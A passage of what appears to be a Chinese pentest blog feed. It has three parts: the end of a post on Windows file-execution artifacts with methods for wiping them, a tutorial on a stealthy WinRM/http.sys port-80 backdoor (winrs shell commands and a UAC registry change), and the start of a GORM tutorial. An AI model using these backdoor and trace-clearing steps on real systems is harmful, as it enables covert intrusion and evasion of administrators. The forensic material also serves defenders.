%APPDATA%\Microsoft\Windows\Recent</span><br></pre></td></tr></tbody></table></figure><p></p><p>清除方法：清除<code>%APPDATA%\Microsoft\Windows\Recent</code>路径下的文件即可</p><h3 id="Amcache-RecentFileCache-bcf"><a href="#Amcache-RecentFileCache-bcf" class="headerlink" title="Amcache / RecentFileCache.bcf"></a>Amcache / RecentFileCache.bcf</h3><blockquote><p>Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。</p></blockquote><p><code>win7</code>、<code>windows server 2008R2</code>等系统保存位置：</p><blockquote><p>只包含了程序的创建时间、上次修改时间、上次访问时间和文件名</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\AppCompat\Programs\RecentFileCache.bcf</span><br></pre></td></tr></tbody></table></figure><p><code>win8</code>、<code>win10</code>、<code>windows server 2012</code>等系统保存位置：</p><blockquote><p>包含了文件大小、版本、sha1、二进制文件类型等等信息</p></blockquote><p><strong>注</strong>：Win7系统安装<code>KB2952664</code>后，也会支持Amcache.hve<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\AppCompat\Programs\Amcache.hve</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>RecentFileCache.bcf</code>解析工具</p><p><code>c#</code>版：<a href="https://github.com/EricZimmerman/RecentFileCacheParser" target="_blank" rel="noopener">https://github.com/EricZimmerman/RecentFileCacheParser</a></p><p>用法实例：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RecentFileCacheParser.exe -f "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" --csv "c:\temp"</span><br><span class="line">RecentFileCacheParser.exe -f "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" --json "D:\jsonOutput" --jsonpretty</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127113422-e89d8972-40b5-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127113608-27c3538e-40b6-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p><code>python</code>版：<a href="https://github.com/prolsen/recentfilecache-parser" target="_blank" rel="noopener">https://github.com/prolsen/recentfilecache-parser</a></p><p>用法<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rfcparse.py -f C:\Windows\AppCompat\Programs\RecentFileCache.bcf</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>Amcache.hve</code>解析工具</p><p><code>c#</code>版: <a href="https://github.com/EricZimmerman/AmcacheParser" target="_blank" rel="noopener">https://github.com/EricZimmerman/AmcacheParser</a></p><p><code>python</code>版: <a href="https://github.com/williballenthin/python-registry/blob/master/samples/amcache.py" target="_blank" rel="noopener">https://github.com/williballenthin/python-registry/blob/master/samples/amcache.py</a></p><p><code>powershell</code>版: <a href="https://github.com/yoda66/GetAmCache/blob/master/Get-Amcache.ps1" target="_blank" rel="noopener">https://github.com/yoda66/GetAmCache/blob/master/Get-Amcache.ps1</a></p><p>用法示例：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AmcacheParser.exe -f "C:\Windows\AppCompat\Programs\Amcache.hve" --csv C:\temp</span><br><span class="line">AmcacheParser.exe -f "C:\Windows\AppCompat\Programs\Amcache.hve" -i on --csv C:\temp</span><br><span class="line">AmcacheParser.exe -f "C:\Windows\AppCompat\Programs\Amcache.hve" -w "c:\temp\whitelist.txt" --csv C:\temp</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果我们直接执行的话，会提示：”正由另一进程使用，因此该进程无法访问此文件”</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127111659-7add0afe-40b3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>解决方法是把<code>Amcache.hve</code>复制到其它目录，我们可以使用<code>shadow copy</code>把<code>Amcache.hve</code>复制到当前目录，然后再执行就可以了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127111126-b48c437e-40b2-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127114132-e9403f36-40b6-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法可以参考三好学生师傅的这篇文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-RecentFileCache.bcf%E5%92%8CAmcache.hve%E5%8D%95%E6%9D%A1%E8%AE%B0%E5%BD%95%E7%9A%84%E6%B8%85%E9%99%A4/" target="_blank" rel="noopener">链接</a></p><h3 id="SRUM-System-Resource-Usage-Monitor"><a href="#SRUM-System-Resource-Usage-Monitor" class="headerlink" title="SRUM (System Resource Usage Monitor)"></a>SRUM (System Resource Usage Monitor)</h3><blockquote><p>Technology that monitors desktop application programs,services, windows apps and network connections</p></blockquote><p><a href="[https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492184583.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492184583.pdf">参考文章</a></p><p>适用于<code>win8</code>及以上系统，数据加密，实时记录</p><p>可以使用python解析：<a href="https://github.com/MarkBaggett/srum-dump" target="_blank" rel="noopener">https://github.com/MarkBaggett/srum-dump</a></p><p>用法实例：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">srum_dump2.exe --SRUM_INFILE c:\Windows\system32\sru\SRUDB.dat</span><br><span class="line"></span><br><span class="line">python srum_dump2.py --SRUM_INFILE c:\Windows\system32\sru\SRUDB.dat</span><br></pre></td></tr></tbody></table></figure><p></p><p>清除方法：待补充</p><h3 id="win10时间轴"><a href="#win10时间轴" class="headerlink" title="win10时间轴"></a>win10时间轴</h3><blockquote><p><code>Windows Timeline</code>是Windows10在1803版中引入的一个新特性</p></blockquote><p>用户可以使用<code>Win</code> + <code>Tab</code>可以对其进行访问，时间轴就像浏览器的历史记录一样，它记录了包含您访问过的网站，还包含您编辑的文档，您玩过的游戏，您查看或创建的图像等，其保存的记录在<code>ActivitiesCache.db</code>之中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127201147-310f7858-40fe-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>参考文章：</p><p><a href="https://kacos2000.github.io/WindowsTimeline/WindowsTimeline.pdf" target="_blank" rel="noopener">https://kacos2000.github.io/WindowsTimeline/WindowsTimeline.pdf</a></p><p><a href="https://cclgroupltd.com/2018/05/03/windows-10-timeline-forensic-artefacts/" target="_blank" rel="noopener">https://cclgroupltd.com/2018/05/03/windows-10-timeline-forensic-artefacts/</a></p><p><code>ActivitiesCache.db</code>位置在</p><p><strong>注</strong>：无加密，数据实时更新<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;username&gt;\AppData\Local\ConnectedDevicesPlatform\&lt;random_char&gt;\ActivitiesCache.db</span><br></pre></td></tr></tbody></table></figure><p></p><p>本质是<code>sqlite3</code>数据库文件，它包含的表如下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127194001-c0c8cb16-40f9-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>其中最重要的一个表是<code>Activity</code>，<code>Activity</code>表包含的字段有<code>AppId</code>（包含应用程序的路径），开始时间，结束时间等等</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127194940-1a011930-40fb-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：删掉<code>sqlite3</code>数据库文件中指定记录即可</p><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>计划任务往往是一个值得关注的点也是一个容易忽略的点。站在攻击的角度来讲，计划任务可以持久化后门、执行指定恶意程序等等；站在防御、取证的角度来讲，计划任务执行之后，系统是不会自动删除的（重启或者注销也是不会删除的），这就可能导致入侵者会忽略把计划任务清除，这就有利于我们的取证</p><p>列出所有任务<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd：</span><br><span class="line">schtasks.exe</span><br><span class="line"></span><br><span class="line">powershell：</span><br><span class="line">Get-ScheduledTask</span><br></pre></td></tr></tbody></table></figure><p></p><p>根据文件夹列出所有任务<br>powershell:<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ScheduledTask -TaskPath "\"</span><br></pre></td></tr></tbody></table></figure><p></p><p>根据任务名查看任务的详情信息<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks.exe /query /v /tn test /fo list</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128103155-599ad808-4176-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：删除指定的计划任务即可：<code>schtasks.exe /delete /tn Task_name /F</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>站在攻击者的角度来说，获取系统中的文件执行记录有利于我们信息收集、清理系统中的文件执行记录能进一步防止暴露自己</p><p>站在防御、取证的角度来说，定期清理系统中的文件执行记录能防止一些敏感信息泄露，但是这些信息能够被伪造和删除的所以不能盲目相信</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/</a></p><p><a href="https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1" target="_blank" rel="noopener">https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用http.sys端口复用实现后门</title>
      <link href="/2020/01/22/%E5%88%A9%E7%94%A8http-sys%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0%E5%90%8E%E9%97%A8/"/>
      <url>/2020/01/22/%E5%88%A9%E7%94%A8http-sys%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0%E5%90%8E%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="利用http-sys端口复用实现后门"><a href="#利用http-sys端口复用实现后门" class="headerlink" title="利用http.sys端口复用实现后门"></a>利用http.sys端口复用实现后门</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这个后门的基本原理是用<code>Windows</code>的远程管理管理服务<code>WinRM</code>配合<code>http.sys</code>端口复用的特性实现正向连接的后门</p><h2 id="http-sys"><a href="#http-sys" class="headerlink" title="http.sys"></a>http.sys</h2><p>简介<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP.sys是仅在Windows上运行的ASP.NET Core的web服务器。HTTP.sys是Kestrel服务器的替代品，它提供了Kestrel没有提供的一些功能。</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>http.sys</code>支持的系统<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. Windows 7 or later</span><br><span class="line">2. Windows Server 2008 R2 or later</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>HTTP.sys</code>支持以下特性：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Windows Authentication</span><br><span class="line">2. Port sharing</span><br><span class="line">3. HTTPS with SNI</span><br><span class="line">4. HTTP/2 over TLS (Windows 10 or later)</span><br><span class="line">5. Direct file transmission</span><br><span class="line">6. Response caching</span><br><span class="line">7. WebSockets (Windows 8 or later)</span><br></pre></td></tr></tbody></table></figure><p></p><p>其中<code>Port sharing</code>就是我们要利用<code>http.sys</code>的特性之一端口复用，所有基于<code>HTTP.sys</code>驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可，使用<code>netsh http show servicestate</code>命令可以查看所有在<code>HTTP.sys</code>上注册过的url前缀。</p><h3 id="开启WinRM服务"><a href="#开启WinRM服务" class="headerlink" title="开启WinRM服务"></a>开启<code>WinRM</code>服务</h3><ol><li><code>Windows Server 2012</code>及以上默认是开启<code>WinRM</code>服务的</li><li><code>Windows Server 2008 R2</code>需要<code>winrm quickconfig -q</code>来启动<code>WinRM</code>服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122213210-9778fbb4-3d1b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="添加80端口Listener"><a href="#添加80端口Listener" class="headerlink" title="添加80端口Listener"></a>添加80端口Listener</h2><p> <code>Windows 2012</code>及以上就只需要执行一条命令就可以实现：<code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122215742-289ec85a-3d1f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>查看<code>Listener</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122220258-e4d3b512-3d1f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>还有要注意一点就是：<code>Windows Server 2008 R2</code>是默认不开启<code>WinRM</code>服务的，但是我们启动了之后就会监听<code>5985</code>端口，如图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122220929-ce714b1c-3d20-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>这就会让管理员起疑心，所以我们就要修改一下<code>WinRM</code>的端口，通过下面这条命令把<code>WinRM</code>的端空改为80端口：<br><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122221308-50a1d19c-3d21-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="本地连接配置"><a href="#本地连接配置" class="headerlink" title="本地连接配置"></a>本地连接配置</h2><p>本地配置执行以下两条命令即可，执行以下两条命令即可。</p><ol><li>开启接<code>WinRM</code>服务：<code>winrm quickconfig -q</code></li><li>设置信任连接的主机：<code>winrm set winrm/config/Client @{TrustedHosts="*"}</code></li></ol><p>然后我们就可以使用<code>winrs</code>命令连接远程<code>WinRM</code>服务执行命令即可<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.141.148 -u:administrator -p:qiyou whoami</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122221950-404e6f34-3d22-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>返回交互式shell<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.141.148 -u:administrator -p:qiyou cmd</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122222923-95aa8d90-3d23-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="UAC限制"><a href="#UAC限制" class="headerlink" title="UAC限制"></a>UAC限制</h2><p>经过测试<code>Windows Server 2012</code>的<code>WinRM</code>服务受<code>UAC</code>限制，<code>administrators</code>组除了<code>administrator</code>能登陆之外，其它用户是登陆不了的，但是<code>Windows Server 2008</code>不受<code>UAC</code>限制，<code>Windows Server 2012</code>的非<code>administrator</code>用户如果直接登陆就会出现如下情况</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122224651-06c50a12-3d26-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>需要修改以下注册表，PS：修改之后不需要重启<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></tbody></table></figure><p></p><p>修改之后就可以成功登陆了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122224859-52946618-3d26-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GORM学习</title>
      <link href="/2020/01/20/GORM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/20/GORM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="GORM学习"><a href="#GORM学习" class="headerlink" title="GORM学习"></a>GORM学习</h1><p>大部分实例来自文档</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><h3 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a>模型定义</h3><p>实例<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">  gorm.Model</span><br><span class="line">  Name         <span class="keyword">string</span></span><br><span class="line">  Age          sql.NullInt64</span><br><span class="line">  Birthday     *time.Time</span><br><span class="line">  Email        <span class="keyword">string</span>  <span class="string">`gorm:"type:varchar(100);unique_index"`</span></span><br><span class="line">  Role         <span class="keyword">string</span>  <span class="string">`gorm:"size:255"`</span> <span class="comment">//设置字段的大小为255个字节</span></span><br><span class="line">  MemberNumber *<span class="keyword">string</span> <span class="string">`gorm:"unique;not null"`</span> <span class="comment">// 设置 memberNumber 字段唯一且不为空</span></span><br><span class="line">  Num          <span class="keyword">int</span>     <span class="string">`gorm:"AUTO_INCREMENT"`</span> <span class="comment">// 设置 Num字段自增</span></span><br><span class="line">  Address      <span class="keyword">string</span>  <span class="string">`gorm:"index:addr"`</span> <span class="comment">// 给Address 创建一个名字是  `addr`的索引</span></span><br><span class="line">  IgnoreMe     <span class="keyword">int</span>     <span class="string">`gorm:"-"`</span> <span class="comment">//忽略这个字段</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>支持的结构标签<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">标签说明</span><br><span class="line">Column指定列的名称</span><br><span class="line">Type指定列的类型</span><br><span class="line">Size指定列的大小，默认是 255</span><br><span class="line">PRIMARY_KEY指定一个列作为主键</span><br><span class="line">UNIQUE指定一个唯一的列</span><br><span class="line">DEFAULT指定一个列的默认值</span><br><span class="line">PRECISION指定列的数据的精度</span><br><span class="line">NOT NULL指定列的数据不为空</span><br><span class="line">AUTO_INCREMENT指定一个列的数据是否自增</span><br><span class="line">INDEX创建带或不带名称的索引，同名创建复合索引</span><br><span class="line">UNIQUE_INDEX类似 索引，创建一个唯一的索引</span><br><span class="line">EMBEDDED将 struct 设置为 embedded</span><br><span class="line">EMBEDDED_PREFIX设置嵌入式结构的前缀名称</span><br><span class="line">-忽略这些字段</span><br></pre></td></tr></tbody></table></figure><p></p><p>关联的结构标签<br>有关详细信息，请查看「关联」部分<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">标签说明</span><br><span class="line">MANY2MANY指定连接表名称</span><br><span class="line">FOREIGNKEY指定外键</span><br><span class="line">ASSOCIATION_FOREIGNKEY指定关联外键</span><br><span class="line">POLYMORPHIC指定多态类型</span><br><span class="line">POLYMORPHIC_VALUE指定多态的值</span><br><span class="line">JOINTABLE_FOREIGNKEY指定连接表的外键</span><br><span class="line">ASSOCIATION_JOINTABLE_FOREIGNKEY指定连接表的关联外键</span><br><span class="line">SAVE_ASSOCIATIONS是否自动保存关联</span><br><span class="line">ASSOCIATION_AUTOUPDATE是否自动更新关联</span><br><span class="line">ASSOCIATION_AUTOCREATE是否自动创建关联</span><br><span class="line">ASSOCIATION_SAVE_REFERENCE是否引用自动保存的关联</span><br><span class="line">PRELOAD是否自动预加载关联</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>PS：gorm支持自动迁移，但是要注意的几点是：它只会创建表，补充缺少的列和缺少的索引。但并不会更改已经存在的列类型、不会更改列名、也不会删除不再用的列，这样设计的目的是为了保护已存在的数据。</p><p><code>gorm.Model</code>是这么定义的，这个方便嵌入我们的模型<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type Model struct {</span><br><span class="line">ID        uint `gorm:"primary_key"`</span><br><span class="line">CreatedAt time.Time</span><br><span class="line">UpdatedAt time.Time</span><br><span class="line">DeletedAt *time.Time `sql:"index"`</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">type Use struct{</span><br><span class="line">    gorm.Model</span><br><span class="line">    Username string</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>表名默认是结构体的<strong>复数形式</strong><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {} <span class="comment">// 默认表名是`users`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置表名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(User)</span><span class="title">TableName</span><span class="params">()</span><span class="title">string</span></span>{</span><br><span class="line"><span class="keyword">return</span> <span class="string">"user"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//禁用表名复数形式</span></span><br><span class="line">db.SingularTable(<span class="literal">true</span>) <span class="comment">//当为true时，默认为user，而不是users</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们还可以更改默认表名，我们可以通过<code>DefaultTableNameHandler</code>来更改默认命名规则<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gorm.DefaultTableNameHandler=<span class="function"><span class="keyword">func</span><span class="params">(db *gorm.DB, defaultTableName <span class="keyword">string</span>)</span> <span class="title">string</span></span> {</span><br><span class="line"><span class="keyword">return</span> <span class="string">"gorm_"</span>+defaultTableName</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>列名默认是字段名的蛇形小写<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">gorm.Model</span><br><span class="line">UserName <span class="keyword">string</span> <span class="comment">//迁移到mysql的时候会变成user_name</span></span><br><span class="line">PassWord <span class="keyword">string</span> <span class="comment">//迁移到mysql的时候会变成pass_word</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//但是我们可以通过tag来改变字段名</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">gorm.Model</span><br><span class="line">UserName <span class="keyword">string</span> <span class="string">`gorm:"column:username"`</span></span><br><span class="line">PassWord <span class="keyword">string</span> <span class="string">`gorm:"column:password"`</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>指定名称创建一个表<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.Table(<span class="string">"test_grom"</span>).CreateTable(&amp;User{})</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>你可以使用原生的数据库驱动程序连接，但是没有这个必要，因为gorm里面封装了部分常见的驱动，连接的参数和原生都差不多。<br>仅仅包含下面4种主流的关系型数据库，但是对我们来说已经基本够用了<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _ <span class="string">"github.com/jinzhu/gorm/dialects/mysql"</span></span><br><span class="line"><span class="keyword">import</span> _ <span class="string">"github.com/jinzhu/gorm/dialects/postgres"</span></span><br><span class="line"><span class="keyword">import</span> _ <span class="string">"github.com/jinzhu/gorm/dialects/sqlite"</span></span><br><span class="line"><span class="keyword">import</span> _ <span class="string">"github.com/jinzhu/gorm/dialects/mssql"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>MySQL<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 